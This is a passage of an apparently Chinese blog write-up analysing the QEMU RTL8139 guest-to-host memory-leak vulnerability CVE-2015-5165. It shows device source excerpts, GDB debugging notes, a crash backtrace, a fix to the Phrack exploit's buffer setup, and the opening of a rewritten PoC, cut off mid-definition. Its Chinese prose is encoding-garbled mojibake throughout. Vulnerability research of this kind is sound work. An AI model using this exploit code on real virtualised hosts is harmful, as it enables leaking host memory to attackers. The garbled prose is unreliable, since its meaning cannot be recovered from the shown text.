<code>lspci</code> å‘½ä»¤å¯ä»¥çœ‹åˆ° RTL8139 ç½‘å¡çš„ PMIO çš„èµ·å§‹åœ°å€ä¸º <code>0xC000</code> ï¼Œå¤§å°ä¸º <code>256</code> å­—èŠ‚ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> lspci</span></span><br><span class="line">00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)</span><br><span class="line">00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)</span><br><span class="line">00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)</span><br><span class="line">00:03.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)</span><br><span class="line">00:04.0 Ethernet controller: Realtek Semiconductor Co., Ltd. RTL-8100/8101L/8139 PCI Fast Ethernet Adapter (rev 20)</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> lspci -s 00:04.0 -v</span></span><br><span class="line">00:04.0 Ethernet controller: Realtek Semiconductor Co., Ltd. RTL-8100/8101L/8139 PCI Fast Ethernet Adapter (rev 20)</span><br><span class="line">Subsystem: Red Hat, Inc. QEMU Virtual Machine</span><br><span class="line">Physical Slot: 4</span><br><span class="line">Flags: bus master, fast devsel, latency 0, IRQ 10</span><br><span class="line">I/O ports at c000 [size=256]</span><br><span class="line">Memory at febf1000 (32-bit, non-prefetchable) [size=256]</span><br><span class="line">Expansion ROM at feb80000 [disabled] [size=256K]</span><br><span class="line">Kernel driver in use: 8139cp</span><br><span class="line">Kernel modules: 8139cp, 8139too</span><br></pre></td></tr></table></figure><h3 id="4-3-PMIO-è¯»å†™"><a href="#4-3-PMIO-è¯»å†™" class="headerlink" title="4.3 PMIO è¯»å†™"></a>4.3 PMIO è¯»å†™</h3><p>é€šè¿‡ç»“æ„ä½“ <code>RTL8139State</code> çš„æˆå‘˜ <code>bar_io</code> çš„äº¤å‰å¼•ç”¨å¯ä»¥å®šä½åˆ°å‡½æ•° <code>pci_rtl8139_realize</code> ï¼Œè¿™é‡Œå¯¹ PMIO å’Œ MMIO è¿›è¡Œäº†åˆå§‹åŒ–æ“ä½œï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pci_rtl8139_realize</span><span class="params">(PCIDevice *dev, Error **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RTL8139State *s = RTL8139(dev);</span><br><span class="line">    DeviceState *d = DEVICE(dev);</span><br><span class="line">    <span class="keyword">uint8_t</span> *pci_conf;</span><br><span class="line"></span><br><span class="line">    pci_conf = dev-&gt;config;</span><br><span class="line">    pci_conf[PCI_INTERRUPT_PIN] = <span class="number">1</span>;    <span class="comment">/* interrupt pin A */</span></span><br><span class="line">    <span class="comment">/* <span class="doctag">TODO:</span> start of capability list, but no capability</span></span><br><span class="line"><span class="comment">     * list bit in status register, and offset 0xdc seems unused. */</span></span><br><span class="line">    pci_conf[PCI_CAPABILITY_LIST] = <span class="number">0xdc</span>;</span><br><span class="line"></span><br><span class="line">    memory_region_init_io(&amp;s-&gt;bar_io, OBJECT(s), &amp;rtl8139_io_ops, s,</span><br><span class="line">                          <span class="string">"rtl8139"</span>, <span class="number">0x100</span>);</span><br><span class="line">    memory_region_init_io(&amp;s-&gt;bar_mem, OBJECT(s), &amp;rtl8139_mmio_ops, s,</span><br><span class="line">                          <span class="string">"rtl8139"</span>, <span class="number">0x100</span>);</span><br><span class="line">    pci_register_bar(dev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;s-&gt;bar_io);</span><br><span class="line">    pci_register_bar(dev, <span class="number">1</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;s-&gt;bar_mem);</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PMIO çš„è¯»å†™å‡½æ•°å¯ä»¥ä»å˜é‡ <code>rtl8139_io_ops</code> ä¸­æ‰¾åˆ°ï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps rtl8139_io_ops = &#123;</span><br><span class="line">    .read = rtl8139_ioport_read,</span><br><span class="line">    .write = rtl8139_ioport_write,</span><br><span class="line">    .impl = &#123;</span><br><span class="line">        .min_access_size = <span class="number">1</span>,</span><br><span class="line">        .max_access_size = <span class="number">4</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>PMIO å†™å‡½æ•° <code>rtl8139_ioport_write</code> çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_ioport_write</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (size) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        rtl8139_io_writeb(opaque, addr, val);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        rtl8139_io_writew(opaque, addr, val);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        rtl8139_io_writel(opaque, addr, val);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†™çš„é•¿åº¦å¯ä»¥æ˜¯å­—èŠ‚ã€å­—ã€åŒå­—ï¼Œè¿™é‡Œä»¥å­—èŠ‚ä¸ºå•ä½çš„ PMIO å†™å‡½æ•°ä¸º <code>rtl8139_io_writeb</code> ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_io_writeb</span><span class="params">(<span class="keyword">void</span> *opaque, <span class="keyword">uint8_t</span> addr, <span class="keyword">uint32_t</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RTL8139State *s = opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> MAC0 ... MAC0+<span class="number">4</span>:</span><br><span class="line">            s-&gt;phys[addr - MAC0] = val;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// ......</span></span><br><span class="line">        <span class="keyword">case</span> TxPoll:</span><br><span class="line">            DPRINTF(<span class="string">"C+ TxPoll write(b) val=0x%02x\n"</span>, val);</span><br><span class="line">            <span class="keyword">if</span> (val &amp; (<span class="number">1</span> &lt;&lt; <span class="number">7</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                DPRINTF(<span class="string">"C+ TxPoll high priority transmission (not "</span></span><br><span class="line">                    <span class="string">"implemented)\n"</span>);</span><br><span class="line">                <span class="comment">//rtl8139_cplus_transmit(s);</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (val &amp; (<span class="number">1</span> &lt;&lt; <span class="number">6</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                DPRINTF(<span class="string">"C+ TxPoll normal priority transmission\n"</span>);</span><br><span class="line">                rtl8139_cplus_transmit(s);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“å¾€ <code>TxPoll</code> å†™å…¥æ•°æ®æ—¶ï¼Œå¯ä»¥è§¦å‘ <code>C+ TxPoll normal priority transmission</code> ï¼Œå³è°ƒç”¨å‡½æ•° <code>rtl8139_cplus_transmit</code> ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_cplus_transmit</span><span class="params">(RTL8139State *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> txcount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (rtl8139_cplus_transmit_one(s))</span><br><span class="line">    &#123;</span><br><span class="line">        ++txcount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Mark transfer completed */</span></span><br><span class="line">    <span class="keyword">if</span> (!txcount)</span><br><span class="line">    &#123;</span><br><span class="line">        DPRINTF(<span class="string">"C+ mode : transmitter queue stalled, current TxDesc = %d\n"</span>,</span><br><span class="line">            s-&gt;currCPlusTxDesc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* update interrupt status */</span></span><br><span class="line">        s-&gt;IntrStatus |= TxOK;</span><br><span class="line">        rtl8139_update_irq(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ä¼šå¾ªç¯è°ƒç”¨ <code>rtl8139_cplus_transmit_one</code> ï¼Œä¹Ÿå°±æ˜¯å­˜åœ¨æ¼æ´çš„å‡½æ•°ï¼</p><h3 id="4-4-æ¼æ´è§¦å‘"><a href="#4-4-æ¼æ´è§¦å‘" class="headerlink" title="4.4 æ¼æ´è§¦å‘"></a>4.4 æ¼æ´è§¦å‘</h3><p>å¼„æ¸…æ¥šæ¼æ´çš„åŸç†ä¹‹åï¼Œç¼–å†™ PoC å°±æ¯”è¾ƒç®€å•äº†ï¼å¯¹ Linux å’Œç¡¬ä»¶æ¥è§¦ä¸å¤šçš„åˆå­¦è€…ï¼ˆæ¯”å¦‚ç¬”è€…è‡ªå·±ï¼‰ï¼Œå»ºè®®å°è¯•ç†è§£æ¯ä¸€è¡Œä»£ç çš„ä½œç”¨ï¼Œé‡åˆ°ä¸æ‡‚çš„æ¦‚å¿µå°± Google ä¸€ä¸‹ï¼Œä»£ç ä¸ Work å°± Debug ä¸€ä¸‹ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å¯ä»¥å­¦åˆ°å¾ˆå¤šæ–°çš„çŸ¥è¯†ï¼Œè¿™ä¹Ÿæ­£æ˜¯åˆ†æè¯¥æ¼æ´çš„å‡ºå‘ç‚¹ã€‚</p><p>åœ¨ä¸»æœºä¸­å¯ä»¥é€šè¿‡ GDB é™„åŠ åˆ° QEMU è¿›ç¨‹ <code>qemu-system-x86</code> è¿›è¡Œè°ƒè¯•ï¼Œè§¦å‘æ¼æ´çš„ä½ç½®å¦‚ä¸‹ï¼š</p><p><img src="/uploads/202006/qemu-gdb-debug.png" alt="GDB è°ƒè¯• QEMU æ¼æ´ CVE-2015-5165"></p><p><strong>è°ƒè¯•è¿‡ç¨‹ä¸­é‡åˆ°çš„å‡ ä¸ªå‘ï¼š</strong></p><p><strong>(I)</strong> åœ¨æ„é€ æ•°æ®åŒ…æ—¶ï¼ŒEthernet Frame çš„æº MAC åœ°å€ã€ç›®æ ‡ MAC åœ°å€éœ€è¦å¡«å……ä¸º QEMU è™šæ‹Ÿæœº RTL8139 ç½‘å¡çš„ MAC åœ°å€ï¼Œé€šè¿‡ <code>ifconfig -a</code> å‘½ä»¤å¯ä»¥æŸ¥çœ‹æœ¬æœºæ‰€æœ‰ç½‘å¡çš„æ•°æ®ï¼›ç¬”è€…ä¸€å¼€å§‹ä½¿ç”¨çš„ <code>ifconfig</code> å‘½ä»¤ï¼Œç»“æœååæ²¡æœ‰æ‰“å° RTL8139 ç½‘å¡çš„ä¿¡æ¯ï¼Œå¯¼è‡´å¡«å……äº†é”™è¯¯çš„ MAC åœ°å€ï¼Œé€šè¿‡è°ƒè¯• QEMU è¿›ç¨‹æ‰å‘ç° MAC åœ°å€ä¸ä¸€è‡´ï¼›</p><p><strong>(II)</strong> Phrack æ–‡ç«  [1] æä¾›çš„ Exploit ä»£ç ä¸­ <code>rtl8139_tx_desc</code> æ˜¯æ ˆä¸Šçš„å±€éƒ¨å˜é‡ï¼Œå®é™…æµ‹è¯•æ—¶å‘ç°è·å–ä¸åˆ°åœ¨å†…å­˜ä¸­çš„ç‰©ç†åœ°å€ï¼ˆGuest Physical Addressï¼‰ï¼Œæ”¹ä¸ºä»å †ä¸ŠåŠ¨æ€ç”³è¯·å†…å­˜å³å¯ï¼›è°ƒè¯•å‘ç°æ˜¯ç¬”è€…è‡ªå·±å®ç°çš„è·å–ç‰©ç†å†…å­˜åœ°å€çš„ä»£ç æœ‰é—®é¢˜ï¼Œå› ä¸ºæ ˆçš„åœ°å€å¾ˆé«˜ï¼Œè½¬æ¢æˆæœ‰ç¬¦å·æ•°æ˜¯ä¸€ä¸ªè´Ÿæ•°ï¼Œæ‰€ä»¥åœ¨è°ƒç”¨ <code>fseek</code> çš„æ—¶å€™éœ€è¦å¤„ç†å¥½ç¬¦å·é—®é¢˜ï¼Œå¦åˆ™ <code>fseek</code> ä¼šå¤±è´¥ï¼›</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!fseek(fp, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr / PAGE_SIZE * <span class="number">8</span>, SEEK_SET)) </span><br><span class="line">&#123;</span><br><span class="line">    fread(&amp;pfn, <span class="keyword">sizeof</span>(pfn), <span class="number">1</span>, fp);</span><br><span class="line">    <span class="keyword">if</span> (pfn &amp; PFN_PRESENT) </span><br><span class="line">    &#123;</span><br><span class="line">        pfn &amp;= PFN_PFN;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>(III)</strong> åœ¨ QEMU è™šæ‹Ÿæœºæµ‹è¯• PoC æ—¶ï¼Œå‘ç°æ‰“å°æ¥æ”¶åˆ°çš„æ•°æ®çš„æ—¶å€™è¿›ç¨‹ Crash äº†ï¼Œä»æ‰“å°å‡ºæ¥çš„è°ƒç”¨æ ˆæ¥çœ‹ï¼Œåº”è¯¥æ˜¯æ¥æ”¶ç¼“å†²åŒºæº¢å‡ºäº†ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo ./a.out</span></span><br><span class="line">*** Error in `./a.out': corrupted size vs. prev_size: 0x092975e8 ***</span><br><span class="line">======= Backtrace: =========</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(+0x67377)[0xb75af377]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(+0x6d2f7)[0xb75b52f7]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(+0x6f979)[0xb75b7979]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(__libc_malloc+0xc5)[0xb75b8fc5]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_file_doallocate+0x6e)[0xb75a592e]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_doallocbuf+0x47)[0xb75b31c7]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_file_overflow+0x1c1)[0xb75b2561]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_file_xsputn+0x94)[0xb75b1684]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_vfprintf+0x193)[0xb758a253]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_printf+0x26)[0xb7591696]</span><br><span class="line">./a.out[0x8048b1e]</span><br><span class="line">./a.out[0x8048c61]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf7)[0xb7560637]</span><br><span class="line">./a.out[0x80485b1]</span><br></pre></td></tr></table></figure><p>è°ƒè¯•å‘ç° Phrack æ–‡ç«  [1] æœ«å°¾ç»™å‡ºçš„ä»£ç å­˜åœ¨ä¸€ä¸ª Bugï¼Œè€Œè¿™ä¸ª Bug å±…ç„¶æ²¡æœ‰äººå‘ç°ï¼Œç¬”è€…æœç´¢äº†å›½å†…ç›¸å…³çš„æŠ€æœ¯æ–‡ç« ï¼Œå‘ç°éƒ½ç…§æ¬äº†è¿™ä¸ª Bug ã€‚å…¶ä»–äººæ²¡æœ‰å‘ç°è¿™é‡Œçš„é—®é¢˜ï¼Œå¯èƒ½æ˜¯ç”±äºåˆ†æç¯å¢ƒçš„ä¸åŒæ‰€é€ æˆçš„ï¼š</p><ul><li>ç¬”è€…çš„ QEMU è™šæ‹Ÿæœºä¸­å®‰è£…çš„æ˜¯ Ubuntu å®˜æ–¹å‘è¡Œçš„ Server ç‰ˆæœ¬</li><li>å…¶ä»–æ–‡ç« ä¸­çš„ QEMU è™šæ‹Ÿæœºä¸­å®‰è£…çš„æ˜¯ä¸´æ—¶ç¼–è¯‘çš„ Linux ç³»ç»Ÿ</li></ul><p>å¯¹è¯¥ Bug çš„åˆ†æå¦‚ä¸‹ï¼š</p><ol><li>å‡½æ•° <code>rtl8139_cplus_transmit_one</code> åœ¨å‘é€åˆ†ç‰‡åçš„ Ethernet Frame æ—¶ï¼Œæ•°æ®åŒ…çš„å¤§å°æ˜¯ <code>1514</code> å­—èŠ‚ï¼›</li></ol><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> tcp_chunk_size = ETH_MTU - hlen - tcp_hlen;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="keyword">uint16_t</span> chunk_size = tcp_chunk_size;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="keyword">int</span> tso_send_size = ETH_HLEN + hlen + tcp_hlen + chunk_size;</span><br><span class="line">rtl8139_transfer_frame(s, saved_buffer, tso_send_size,</span><br><span class="line">    <span class="number">0</span>, (<span class="keyword">uint8_t</span> *) dot1q_buffer);</span><br></pre></td></tr></table></figure><ol start="2"><li>å› ä¸ºæ˜¯å‘ç»™æœ¬æœºçš„æ•°æ®ï¼Œæ‰€ä»¥æ‰§è¡Œæµç¨‹ç»ç”± <code>rtl8139_transfer_frame</code> è¿›å…¥ <code>rtl8139_do_receive</code> ï¼Œè¿™é‡Œä¼šæ£€æŸ¥æ¥æ”¶ç¼“å†²åŒºæ˜¯å¦è¿˜æœ‰å¤šä½™çš„ <code>4</code> å­—èŠ‚ç©ºé—´ç”¨äºå¡«å…… Checksum ï¼›</li></ol><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">uint32_t</span> rx_space = rxdw0 &amp; CP_RX_BUFFER_SIZE_MASK;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="keyword">if</span> (size+<span class="number">4</span> &gt; rx_space)</span><br><span class="line">&#123;</span><br><span class="line">    DPRINTF(<span class="string">"C+ Rx mode : descriptor %d size %d received %d + 4\n"</span>,</span><br><span class="line">        descriptor, rx_space, size);</span><br><span class="line">    <span class="comment">// error handling ......</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">dma_addr_t</span> rx_addr = rtl8139_addr64(rxbufLO, rxbufHI);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* receive/copy to target memory */</span></span><br><span class="line"><span class="keyword">if</span> (dot1q_buf) &#123;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    pci_dma_write(d, rx_addr, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="comment">/* write checksum */</span></span><br><span class="line">val = cpu_to_le32(crc32(<span class="number">0</span>, buf, size_));</span><br><span class="line">pci_dma_write(d, rx_addr+size, (<span class="keyword">uint8_t</span> *)&amp;val, <span class="number">4</span>);</span><br></pre></td></tr></table></figure><ol start="3"><li>Phrack æ–‡ç«  [1] å¯¹æ¥æ”¶ç¼“å†²åŒºçš„è®¾ç½®ä½äºå‡½æ•° <code>rtl8139_desc_config_rx</code> ï¼Œå¯ä»¥æ¯ä¸€ä¸ª <code>ring / descriptor</code> å…³è”çš„ç¼“å†²åŒºçš„å¤§å°æ˜¯ <code>RTL8139_BUFFER_SIZE</code> å³ <code>1514</code> å­—èŠ‚ï¼Œä½†æ˜¯ <code>dw0</code> æ ‡å¿—ä¸­è®¾ç½®çš„å¤§å°å´æ˜¯ <code>USHRT_MAX</code> å³ <code>65535</code> ï¼›</li></ol><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_rx</span><span class="params">(struct rtl8139_ring *ring,</span></span></span><br><span class="line"><span class="function"><span class="params">                            struct rtl8139_desc *desc, <span class="keyword">int</span> nb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> addr;</span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nb; i++) &#123;</span><br><span class="line">ring[i].desc = &amp;desc[i];</span><br><span class="line"><span class="built_in">memset</span>(ring[i].desc, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct rtl8139_desc));</span><br><span class="line"></span><br><span class="line">ring[i].buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);</span><br><span class="line"><span class="built_in">memset</span>(ring[i].buffer, <span class="number">0</span>, RTL8139_BUFFER_SIZE);</span><br><span class="line"></span><br><span class="line">addr = (<span class="keyword">uint32_t</span>)gva_to_gpa(ring[i].buffer);</span><br><span class="line"></span><br><span class="line">ring[i].desc-&gt;dw0 |= CP_RX_OWN;</span><br><span class="line"><span class="keyword">if</span> (i == nb - <span class="number">1</span>)</span><br><span class="line">ring[i].desc-&gt;dw0 |= CP_RX_EOR;</span><br><span class="line">ring[i].desc-&gt;dw0 &amp;= ~CP_RX_BUFFER_SIZE_MASK;</span><br><span class="line">ring[i].desc-&gt;dw0 |= USHRT_MAX;</span><br><span class="line">ring[i].desc-&gt;buf_lo = addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">addr = (<span class="keyword">uint32_t</span>)gva_to_gpa(desc);</span><br><span class="line">outl(addr, RTL8139_PORT + RxRingAddrLO);</span><br><span class="line">outl(<span class="number">0x0</span>, RTL8139_PORT + RxRingAddrHI);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>è¿™æ ·çš„è®¾ç½®æ˜¾ç„¶æ˜¯ä¸å¯¹çš„ï¼Œè¿™ä¼šå¯¼è‡´å¯ä»¥é€šè¿‡å‡½æ•° <code>rtl8139_do_receive</code> ä¸­çš„ç¼“å†²åŒºå¤§å°æ£€æŸ¥ï¼Œåé¢åœ¨å†™å…¥ Checksum æ—¶ä¼šå¯¼è‡´å †å—è¶Šç•Œå†™ï¼Œè¿™å°±æ˜¯å¯¼è‡´ QEMU è™šæ‹Ÿæœºä¸­ PoC è¿›ç¨‹ Crash çš„åŸå› ï¼›</li></ol><p>å‚è€ƒ Phrack æ–‡ç« çš„ä»£ç ï¼Œç¬”è€…é‡å†™çš„ä¸€ä»½ç”¨äºæµ‹è¯• CVE-2015-5165 çš„å®Œæ•´ PoC ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// é¡µé¢ç›¸å…³å‚æ•°</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Ethernet Frame å¤§å°</span></span><br><span class="line"><span class="comment">// DST(6) + SRC(6) + Length/Type(2) + PayloadMTU(1500)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RTL8139_BUFFER_SIZE 1514</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 ç½‘å¡ PMIO åœ°å€</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RTL8139_PORT 0xc000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Rx ownership flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_OWN (1&lt;&lt;31)</span></span><br><span class="line"><span class="comment">// w0 end of ring flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="comment">// Rx buffer size mask è¡¨ç¤º 0 ~ 12 ä½ä¸º buffer size</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_BUFFER_SIZE_MASK ((1&lt;&lt;13) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Tx ownership flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_OWN (1&lt;&lt;31)</span></span><br><span class="line"><span class="comment">// Tx end of ring flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="comment">// last segment of received packet flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LS (1&lt;&lt;28)</span></span><br><span class="line"><span class="comment">// large send packet flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LGSEN (1&lt;&lt;27)</span></span><br><span class="line"><span class="comment">// IP checksum offload flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_IPCS (1&lt;&lt;18)</span></span><br><span class="line"><span class="comment">// TCP checksum offload flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_TCPCS (1&lt;&lt;16)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 ç½‘å¡å¯„å­˜å™¨åç§»åœ°å€</span></span><br><span class="line"><span class="keyword">enum</span> RTL8139_registers </span><br><span class="line">&#123;</span><br><span class="line">    TxAddr0      = <span class="number">0x20</span>,    <span class="comment">// Tx descriptors address</span></span><br><span class="line">    ChipCmd      = <span class="number">0x37</span>,</span><br><span class="line">    TxConfig     = <span class="number">0x40</span>,</span><br><span class="line">    RxConfig     = <span class="number">0x44</span>,</span><br><span class="line">    TxPoll       = <span class="number">0xD9</span>,    <span class="comment">// tell chip to check Tx descriptors for work</span></span><br><span class="line">    CpCmd        = <span class="number">0xE0</span>,    <span class="comment">// C+ Command register (C+ mode only)</span></span><br><span class="line">    <span class="comment">// è™½ç„¶åå­—å†™çš„ RxRingAddr, ä½†å®é™…ä¸Šæ˜¯ Rx descriptor çš„åœ°å€</span></span><br><span class="line">    RxRingAddrLO = <span class="number">0xE4</span>,    <span class="comment">// 64-bit start addr of Rx descriptor</span></span><br><span class="line">    RxRingAddrHI = <span class="number">0xE8</span>,    <span class="comment">// 64-bit start addr of Rx descriptor</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_tx_config_bits </span><br><span class="line">&#123;</span><br><span class="line">    TxLoopBack = (<span class="number">1</span> &lt;&lt; <span class="number">18</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">17</span>), <span class="comment">// enable loopback test mode</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_rx_mode_bits </span><br><span class="line">&#123;</span><br><span class="line">    AcceptErr       = <span class="number">0x20</span>,</span><br><span class="line">    AcceptRunt      = <span class="number">0x10</span>,</span><br><span class="line">    AcceptBroadcast = <span class="number">0x08</span>,</span><br><span class="line">    AcceptMulticast = <span class="number">0x04</span>,</span><br><span class="line">    AcceptMyPhys    = <span class="number">0x02</span>,</span><br><span class="line">    AcceptAllPhys   = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_CplusCmdBits </span><br><span class="line">&#123;</span><br><span class="line">    CPlusRxVLAN   = <span class="number">0x0040</span>, <span class="comment">/* enable receive 